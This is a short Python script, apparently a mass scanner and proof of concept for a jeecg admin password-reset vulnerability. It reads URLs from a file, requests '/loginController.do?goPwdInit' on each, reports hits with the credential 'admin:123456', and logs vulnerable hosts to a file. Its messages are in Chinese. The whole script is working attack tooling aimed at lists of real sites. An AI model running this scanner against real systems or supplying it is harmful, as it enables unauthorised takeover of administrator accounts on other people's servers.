
import json
import requests


urls = open('url.txt')

poc = '/action/usermanager.htm'

for i in urls:
    url = i.rstrip("\n")
    payload = "/loginController.do?goPwdInit"
    vulnurl = url + payload
    try:
        req = requests.get(vulnurl, timeout=10, verify=False)
        if r"loginController.do?pwdInit" in req.text:
            print("[+]存在jeecg 重置admin密码漏洞...(高危)\tpayload: " + vulnurl + "\tadmin:123456", "red")
            with open('漏洞.txt', 'a')as f:
                f.write(str(vulnurl) + '\n')
        else:
            print("[-]不存在jeecg_pwd_reset漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")
